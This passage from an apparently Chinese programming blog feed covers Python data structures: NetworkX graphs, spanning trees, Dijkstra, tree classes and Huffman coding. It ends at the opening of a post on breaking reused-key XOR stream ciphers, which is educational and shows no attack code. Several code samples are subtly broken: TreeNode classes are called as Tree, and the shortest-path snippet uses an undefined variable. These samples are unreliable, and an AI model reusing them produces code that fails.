class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line">N</span><br></pre></td></tr></table></figure><pre><code>[[0, 1, 0, 1, 0, 1, 1], [1, 0, 0, 0, 0, 0, 1], [0, 1, 0, 1, 0, 0, 1], [1, 0, 0, 0, 0, 0, 0], [0, 0, 1, 1, 0, 0, 1], [1, 0, 0, 0, 1, 1, 1], [1, 0, 1, 0, 0, 0, 1]]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当然为了方便，我们也可以直接调用numpy库直接初始化一个邻接矩阵</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">N=np.zeros([<span class="number">7</span>,<span class="number">7</span>])<span class="comment">#初始化一个7节点的图，邻接举证的方式</span></span><br></pre></td></tr></table></figure><p>可以看到因为在python内置了列表和字典这两种数据结构，这就使得我们构建图的过程更加直观和简单。当然构建图的方式不局限于上述的实现方式，其实我们可以参考以上的思路，利用python的特性，如字典，列表和集合对象，十分自由方便的创建我们自己数据结构。</p><h2 id="NetworkX第三方库"><a href="#NetworkX第三方库" class="headerlink" title="NetworkX第三方库"></a>NetworkX第三方库</h2><p>这个库可以说是相当的强大了，内置了很多图的分析算法，Prim，Dijkstra等等……,具体的可以参考（<a href="https://networkx.github.io/documentation/networkx-1.10/reference/algorithms.html）" target="_blank" rel="noopener">https://networkx.github.io/documentation/networkx-1.10/reference/algorithms.html）</a></p><h3 id="无向图"><a href="#无向图" class="headerlink" title="无向图"></a>无向图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment">#建立一个空的无向图G</span></span><br><span class="line">G=nx.Graph()</span><br><span class="line"><span class="comment">#添加一个节点1</span></span><br><span class="line">G.add_node(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#添加一条边2-3（隐含着添加了两个节点2、3）</span></span><br><span class="line">G.add_edge(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment">#对于无向图，边3-2与边2-3被认为是一条边</span></span><br><span class="line">G.add_edge(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#输出全部的节点</span></span><br><span class="line">print(G.nodes())</span><br><span class="line"><span class="comment"># 添加0-1、1-2和2-3三条边，权重分别是3.0和7.5</span></span><br><span class="line">G.add_weighted_edges_from([(<span class="number">0</span>,<span class="number">1</span>,<span class="number">3.0</span>),(<span class="number">1</span>,<span class="number">2</span>,<span class="number">7.5</span>),(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1.0</span>)])</span><br><span class="line"><span class="comment"># 如果想读取权重，可以使用get_edge_data方法，它接受两个参数u和v，即边的起始点。</span></span><br><span class="line"><span class="keyword">print</span> (G.get_edge_data(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"><span class="comment">#输出全部的边</span></span><br><span class="line"><span class="keyword">print</span> (G.edges())</span><br><span class="line"><span class="comment">#输出边的数量</span></span><br><span class="line"><span class="keyword">print</span> (G.number_of_edges())</span><br><span class="line"><span class="comment">#输出点数</span></span><br><span class="line"><span class="keyword">print</span> (G.number_of_nodes())</span><br><span class="line">nx.draw(G, with_labels=<span class="keyword">True</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3]{&#39;weight&#39;: 7.5}[(1, 3), (1, 0), (1, 2), (2, 3)]44</code></pre><p><img src="/myimages/让数据结构pythonic/output_12_1.png" alt="png"></p><h3 id="有向图"><a href="#有向图" class="headerlink" title="有向图"></a>有向图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line">D=nx.DiGraph()</span><br><span class="line"><span class="comment">#添加一个节点1</span></span><br><span class="line">D.add_node(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#添加一条边2-3（隐含着添加了两个节点2、3）</span></span><br><span class="line">D.add_edge(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment">#对于无向图，边3-2与边2-3被认为是一条边</span></span><br><span class="line">D.add_edge(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#输出全部的节点</span></span><br><span class="line">print(D.nodes())</span><br><span class="line"><span class="comment">#输出全部的边</span></span><br><span class="line"><span class="keyword">print</span> (D.edges())</span><br><span class="line"><span class="comment">#输出边的数量</span></span><br><span class="line"><span class="keyword">print</span> (D.number_of_edges())</span><br><span class="line"><span class="comment">#输出点数</span></span><br><span class="line"><span class="keyword">print</span> (D.number_of_nodes())</span><br><span class="line">nx.draw(D, with_labels=<span class="keyword">True</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3][(1, 2), (2, 3)]23</code></pre><p><img src="/myimages/让数据结构pythonic/output_14_1.png" alt="png"></p><h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成graph </span></span><br><span class="line">G.clear() </span><br><span class="line">G = nx.Graph() </span><br><span class="line">G.add_weighted_edges_from([(<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="number">2</span>),(<span class="string">'0'</span>,<span class="string">'2'</span>,<span class="number">7</span>),(<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="number">3</span>),(<span class="string">'1'</span>,<span class="string">'3'</span>,<span class="number">8</span>),(<span class="string">'1'</span>,<span class="string">'4'</span>,<span class="number">5</span>),(<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="number">1</span>),(<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="number">4</span>)]) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#边和节点信息 </span></span><br><span class="line">edge_labels = nx.get_edge_attributes(G,<span class="string">'weight'</span>)  </span><br><span class="line">labels=&#123;<span class="string">'0'</span>:<span class="string">'0'</span>,<span class="string">'1'</span>:<span class="string">'1'</span>,<span class="string">'2'</span>:<span class="string">'2'</span>,<span class="string">'3'</span>:<span class="string">'3'</span>,<span class="string">'4'</span>:<span class="string">'4'</span>&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">#生成节点位置  </span></span><br><span class="line">pos=nx.spring_layout(G)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#把节点画出来  </span></span><br><span class="line">nx.draw_networkx_nodes(G,pos,node_color=<span class="string">'g'</span>,node_size=<span class="number">500</span>,alpha=<span class="number">0.8</span>)  </span><br><span class="line"> </span><br><span class="line"><span class="comment">#把边画出来  </span></span><br><span class="line">nx.draw_networkx_edges(G,pos,width=<span class="number">1.0</span>,alpha=<span class="number">0.5</span>,edge_color=[<span class="string">'b'</span>,<span class="string">'r'</span>,<span class="string">'b'</span>,<span class="string">'r'</span>,<span class="string">'r'</span>,<span class="string">'b'</span>,<span class="string">'r'</span>])  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#把节点的标签画出来  </span></span><br><span class="line">nx.draw_networkx_labels(G,pos,labels,font_size=<span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#把边权重画出来  </span></span><br><span class="line">nx.draw_networkx_edge_labels(G, pos, edge_labels)  </span><br><span class="line"> </span><br><span class="line"><span class="comment">#显示graph </span></span><br><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>]=<span class="keyword">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line">plt.title(<span class="string">'有权图'</span>) </span><br><span class="line">plt.axis(<span class="string">'on'</span>) </span><br><span class="line">plt.xticks([]) </span><br><span class="line">plt.yticks([]) </span><br><span class="line">plt.show() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 最小生成树</span></span><br><span class="line"><span class="comment">#求得最小生成树,algorithm可以是kruskal,prim,boruvka一种,默认是kruskal </span></span><br><span class="line">KA = nx.minimum_spanning_tree(G,algorithm=<span class="string">'kruskal'</span>) </span><br><span class="line">print(KA.edges(data=<span class="keyword">True</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">#画出最小生成树</span></span><br><span class="line">edge_labels = nx.get_edge_attributes(G,<span class="string">'weight'</span>) </span><br><span class="line">nx.draw_networkx_nodes(KA,pos,node_color=<span class="string">'g'</span>,node_size=<span class="number">500</span>,alpha=<span class="number">0.8</span>)  </span><br><span class="line">nx.draw_networkx_edges(KA,pos,width=<span class="number">1.0</span>,alpha=<span class="number">0.5</span>)  </span><br><span class="line">nx.draw_networkx_labels(KA,pos,font_size=<span class="number">16</span>)  </span><br><span class="line">nx.draw_networkx_edge_labels(G, pos, edge_labels) </span><br><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>]=<span class="keyword">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line">plt.title(<span class="string">'最小生成树'</span>) </span><br><span class="line">plt.axis(<span class="string">'on'</span>) </span><br><span class="line">plt.xticks([]) </span><br><span class="line">plt.yticks([]) </span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接拿到构成最小生成树的边,algorithm可以是kruskal,prim,boruvka一种,默认是kruskal </span></span><br><span class="line">mst = nx.minimum_spanning_edges(G, algorithm=<span class="string">'kruskal'</span>, data=<span class="keyword">False</span>) </span><br><span class="line">edgelist = list(mst) </span><br><span class="line">print(edgelist)</span><br></pre></td></tr></table></figure><p><img src="/myimages/让数据结构pythonic/output_16_0.png" alt="png"></p><pre><code>[(&#39;0&#39;, &#39;1&#39;, {&#39;weight&#39;: 2}), (&#39;1&#39;, &#39;2&#39;, {&#39;weight&#39;: 3}), (&#39;2&#39;, &#39;3&#39;, {&#39;weight&#39;: 1}), (&#39;3&#39;, &#39;4&#39;, {&#39;weight&#39;: 4})]</code></pre><p><img src="/myimages/让数据结构pythonic/output_16_2.png" alt="png"></p><pre><code>[(&#39;2&#39;, &#39;3&#39;), (&#39;0&#39;, &#39;1&#39;), (&#39;1&#39;, &#39;2&#39;), (&#39;3&#39;, &#39;4&#39;)]</code></pre><h3 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成graph </span></span><br><span class="line">G.clear() </span><br><span class="line">G = nx.Graph() </span><br><span class="line">G.add_weighted_edges_from([(<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="number">2</span>),(<span class="string">'0'</span>,<span class="string">'2'</span>,<span class="number">7</span>),(<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="number">3</span>),(<span class="string">'1'</span>,<span class="string">'3'</span>,<span class="number">8</span>),(<span class="string">'1'</span>,<span class="string">'4'</span>,<span class="number">5</span>),(<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="number">1</span>),(<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="number">4</span>)]) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#边和节点信息 </span></span><br><span class="line">edge_labels = nx.get_edge_attributes(G,<span class="string">'weight'</span>)  </span><br><span class="line">labels=&#123;<span class="string">'0'</span>:<span class="string">'0'</span>,<span class="string">'1'</span>:<span class="string">'1'</span>,<span class="string">'2'</span>:<span class="string">'2'</span>,<span class="string">'3'</span>:<span class="string">'3'</span>,<span class="string">'4'</span>:<span class="string">'4'</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">#dijkstra算法</span></span><br><span class="line">dpath=nx.dijkstra_path(G, source=<span class="string">"1"</span>, target=<span class="string">"3"</span>)<span class="comment">#求最短路径</span></span><br><span class="line">dlen=nx.dijkstra_path_length(G,source=<span class="string">"1"</span>, target=<span class="string">"3"</span>)<span class="comment">#求最短距离</span></span><br><span class="line">lis=list(path)</span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> lis:</span><br><span class="line">    print(pt)</span><br><span class="line">print(dlen)</span><br><span class="line">print(dpath)</span><br></pre></td></tr></table></figure><pre><code>4[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]</code></pre><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><ul><li>在树这一块又比较多的概念，包括叶子结点，分支节点，节点的度，树的度，孩子节点，双亲节点，祖先节点，子孙节点，节点的层，树的深度，有序树，无序树……</li><li>树的分类有：树，二叉树（完全二叉树（都有左右节点），满二叉树（所有节点除了最后一层都满了），线索二叉树（存储结构中包括先驱和后继），哈夫曼树（带权的最优二叉树）），森林（只是树的一种组合形式，其实也是树）</li><li>树的遍历：先序遍历，中序遍历，后序遍历，层次遍历</li></ul><h2 id="二叉树类"><a href="#二叉树类" class="headerlink" title="二叉树类"></a>二叉树类</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,left,right)</span>:</span></span><br><span class="line">        self.left=left</span><br><span class="line">        self.right=right</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用方式如下：</span></span><br><span class="line">t=Tree(Tree(<span class="string">"a"</span>,<span class="string">"b"</span>),Tree(<span class="string">"c"</span>,<span class="string">"d"</span>))</span><br><span class="line">t.right.left</span><br></pre></td></tr></table></figure><pre><code>&#39;c&#39;</code></pre><h2 id="多路搜索树"><a href="#多路搜索树" class="headerlink" title="多路搜索树"></a>多路搜索树</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,kids,next=None)</span>:</span></span><br><span class="line">        self.kids=self.val=kids</span><br><span class="line">        self.next=next</span><br><span class="line">t=Tree(Tree(<span class="string">"a"</span>,Tree(<span class="string">"b"</span>,Tree(<span class="string">"c"</span>,Tree(<span class="string">"d"</span>)))))</span><br><span class="line">t.kids.next.next.next.val</span><br></pre></td></tr></table></figure><pre><code>&#39;d&#39;</code></pre><h2 id="孩子双亲表示法"><a href="#孩子双亲表示法" class="headerlink" title="孩子双亲表示法"></a>孩子双亲表示法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.data=<span class="string">'#'</span></span><br><span class="line">        self.parent=<span class="string">'-1'</span></span><br><span class="line">troot=TreeNode()</span><br><span class="line">troot.data=<span class="string">'root'</span></span><br><span class="line">t=TreeNode()</span><br><span class="line">t.data=<span class="string">"kid1"</span></span><br><span class="line">t.parent=troot</span><br><span class="line">t.parent.data</span><br><span class="line">t.parent.data</span><br></pre></td></tr></table></figure><pre><code>&#39;root&#39;</code></pre><h2 id="树的孩子表示法（拉链法）"><a href="#树的孩子表示法（拉链法）" class="headerlink" title="树的孩子表示法（拉链法）"></a>树的孩子表示法（拉链法）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这种方法需要每个为每个节点建立一个孩子链</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.data=<span class="string">'#'</span></span><br><span class="line">        self.FirstChild=<span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChildNode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.index=<span class="number">-1</span><span class="comment">#存储列表中的下标</span></span><br><span class="line">        self.NextSibling=<span class="keyword">None</span></span><br></pre></td></tr></table></figure><h2 id="树的孩子兄弟表示法"><a href="#树的孩子兄弟表示法" class="headerlink" title="树的孩子兄弟表示法"></a>树的孩子兄弟表示法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.data=<span class="string">'#'</span></span><br><span class="line">        self.pFirstChild=<span class="keyword">None</span></span><br><span class="line">        self.pNextSibling=<span class="keyword">None</span></span><br></pre></td></tr></table></figure><h2 id="Huffman-Encoding"><a href="#Huffman-Encoding" class="headerlink" title="Huffman Encoding"></a>Huffman Encoding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> huffman</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"> </span><br><span class="line">t1=huffman.codebook([(<span class="string">'A'</span>, <span class="number">2</span>), (<span class="string">'B'</span>, <span class="number">4</span>), (<span class="string">'C'</span>, <span class="number">1</span>), (<span class="string">'D'</span>, <span class="number">1</span>)])</span><br><span class="line"><span class="keyword">print</span> (t1)</span><br><span class="line">t2=huffman.codebook(collections.Counter(<span class="string">'man the stand banana man'</span>).items())</span><br><span class="line"><span class="keyword">print</span> (t2)</span><br></pre></td></tr></table></figure><pre><code>{&#39;A&#39;: &#39;10&#39;, &#39;B&#39;: &#39;0&#39;, &#39;C&#39;: &#39;110&#39;, &#39;D&#39;: &#39;111&#39;}{&#39;m&#39;: &#39;0111&#39;, &#39;a&#39;: &#39;10&#39;, &#39;n&#39;: &#39;00&#39;, &#39; &#39;: &#39;111&#39;, &#39;t&#39;: &#39;1101&#39;, &#39;h&#39;: &#39;0101&#39;, &#39;e&#39;: &#39;0100&#39;, &#39;s&#39;: &#39;0110&#39;, &#39;d&#39;: &#39;11001&#39;, &#39;b&#39;: &#39;11000&#39;}</code></pre><h2 id="第三方库实现class-tree"><a href="#第三方库实现class-tree" class="headerlink" title="第三方库实现class tree"></a>第三方库实现class tree</h2><p>其实只要到github 上搜索python tree 关键字就可以找到很多前人实现好的树类，所以本着拿来主义，我们可以在需要的时候直接进行import。这里推荐一种二叉树的实现类——binarytree(<a href="https://github.com/joowani/binarytree)。" target="_blank" rel="noopener">https://github.com/joowani/binarytree)。</a><br>里面实现了二叉树的创建，反回树的属性和四种不同的遍历算法等。下面主要对这个库进行一些简单的使用介绍。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binarytree <span class="keyword">import</span> Node</span><br><span class="line"></span><br><span class="line">root=Node(<span class="number">1</span>)</span><br><span class="line">root.left = Node(<span class="number">2</span>)</span><br><span class="line">root.right = Node(<span class="number">3</span>)</span><br><span class="line">root.left.right = Node(<span class="number">4</span>)</span><br><span class="line">root.left.right.left=Node(<span class="number">5</span>)</span><br><span class="line">root.left.right.right=Node(<span class="number">6</span>)</span><br><span class="line">print(root)</span><br></pre></td></tr></table></figure><pre><code>  ______1 /       \2__       3   \    4   / \  5   6</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(root.values)</span><br></pre></td></tr></table></figure><pre><code>[1, 2, 3, None, 4, None, None, None, None, 5, 6]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(root.max_leaf_depth,root.height,root.max_node_value,root.size)</span><br></pre></td></tr></table></figure><pre><code>3 3 6 6</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(root.inorder)<span class="comment">#中序遍历</span></span><br></pre></td></tr></table></figure><pre><code>[Node(2), Node(5), Node(4), Node(6), Node(1), Node(3)]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(root.preorder)<span class="comment">#先序遍历</span></span><br></pre></td></tr></table></figure><pre><code>[Node(1), Node(2), Node(4), Node(5), Node(6), Node(3)]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(root.postorder)<span class="comment">#后序遍历</span></span><br></pre></td></tr></table></figure><pre><code>[Node(5), Node(6), Node(4), Node(2), Node(3), Node(1)]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(root.levelorder)<span class="comment">#层级遍历</span></span><br></pre></td></tr></table></figure><pre><code>[Node(1), Node(2), Node(3), Node(4), Node(5), Node(6)]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(list(root))<span class="comment">#对binarytree对象使用list方法默认采用层级遍历</span></span><br></pre></td></tr></table></figure><pre><code>[Node(1), Node(2), Node(3), Node(4), Node(5), Node(6)]</code></pre><blockquote><p>当然了，还有一些其他的库，如treelib（<a href="https://treelib.readthedocs.io/en/latest/pyapi.html）" target="_blank" rel="noopener">https://treelib.readthedocs.io/en/latest/pyapi.html）</a></p></blockquote><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1]<a href="https://github.com/prakhar1989/Algorithms" target="_blank" rel="noopener">https://github.com/prakhar1989/Algorithms</a><br>[2]<a href="https://github.com/qiwsir/algorithm/blob/master/binary_tree_python.md" target="_blank" rel="noopener">https://github.com/qiwsir/algorithm/blob/master/binary_tree_python.md</a><br>[3]<a href="https://github.com/OmkarPathak/pygorithm" target="_blank" rel="noopener">https://github.com/OmkarPathak/pygorithm</a><br>[4]<a href="https://www.cnblogs.com/wushaogui/p/9239735.html" target="_blank" rel="noopener">https://www.cnblogs.com/wushaogui/p/9239735.html</a><br>[5]<a href="https://github.com/keon/algorithms" target="_blank" rel="noopener">https://github.com/keon/algorithms</a> </p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>流密码攻击理论实践</title>
      <link href="/2018/10/08/%E6%B5%81%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E7%90%86%E8%AE%BA%E5%AE%9E%E8%B7%B5/"/>
      <url>/2018/10/08/%E6%B5%81%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E7%90%86%E8%AE%BA%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/流密码攻击/index.jpg" height="450" width="450"></p><blockquote><p>最近的密码学作业中涉及了一些关于重用密码本的密文破解的问题，感觉还是比较有价值的，所以在国庆期间打算借旅游之余把这篇文章落成。</p></blockquote><a id="more"></a><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一次一密的流密码被理论证明是完全理想化的不可破解的完美安全的加密方式。但是在现实生活中我们没法做到真正的伪随机的密密钥流。对于这种情况，想到的措施就是设计出攻击者优势可忽略的伪随机生成器，然后利用极短的密钥来近似的生成一次一密的密钥流。当然这篇文章不是讨论这些理论的证明和伪随机数生成器如何应用到安全的流密码，而是想介绍一些比较古老流密码的攻击思路，虽说比较古老，但是其指导意义和思维的锻炼是一点不含糊。</p><h1 id="不安全的流密码使用举例"><a href="#不安全的流密码使用举例" class="headerlink" title="不安全的流密码使用举例"></a>不安全的流密码使用举例</h1><blockquote><p>其中的一道题是coursa 密码学课程上的课后编程题，另一道题目是crypto chanllege set1 的一道流密码密钥重用的题。 在之后我们将尝试用两种方法来对其进行统计学以及英语特性上的攻击。这些攻击相当的犀利，准确率极高，只要捕获的密文足够多就能够实现对密钥的无差别猜解。以下是题目：</p></blockquote><h2 id="coursa"><a href="#coursa" class="headerlink" title="coursa"></a><a href="https://www.coursera.org/learn/crypto/quiz/KZ9js/week-1-programming-assignment-optional" target="_blank" rel="noopener">coursa</a></h2><p>这道题目的大概意思说，我们捕获了一连串的密文，已知这些密文的加密方式为i抑或，并且抑或的密码本被多次使用了，我们能否通过这些捕获的存在不合理抑或利用方式的加密密文来还原出明文。读者可以点进连接去自己看看原题。不过这篇文章打算以下一个题目作为例子进行讲解，二者的解体思路和方法大同小异，核心思路一致。</p><h2 id="crypto-chanllege-set1-question6"><a href="#crypto-chanllege-set1-question6" class="headerlink" title="crypto chanllege set1 question6"></a><a href="https://cryptopals.com/sets/1/challenges/6" target="_blank" rel="noopener">crypto chanllege set1 question6</a></h2><p>这道题目很上一道题目其实十分的相似，都是流密码重用的类型，但是根据题目的提示，我们可以了解到一种利用汉明距离来进行密钥长度的猜接手段——汉名距离，在解除密钥长度后，我们可以采取两个方法来获取明文信息，具体细节稍后进行阐述。读者可以先进入原题进行一些初步理解，这里就不对题目做过多的解释。</p><h1 id="攻击细节"><a 